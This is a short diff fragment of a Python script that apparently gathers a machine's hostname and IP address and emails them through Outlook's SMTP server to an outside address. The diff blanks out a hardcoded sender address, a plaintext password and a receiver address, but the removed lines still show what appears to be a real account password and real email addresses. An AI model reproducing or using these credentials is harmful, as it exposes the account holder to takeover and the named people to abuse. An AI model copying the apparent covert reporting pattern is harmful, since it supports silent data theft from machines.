@@ -21,9 +21,9 @@ def get_ip_address():
 pc = socket.gethostname()
 smtp_server = "smtp-mail.outlook.com"
 smtp_port = 587
-sender_email = "crankyjoke2023@outlook.com"
-sender_password = "Defrol2006"
-receiver_email = "liushiyang1119cn@yeah.net"
+sender_email = ""
+sender_password = ""
+receiver_email = ""
 
 if not os.path.exists("C:/SysWOW64"):
     if not os.path.exists("C:/"):
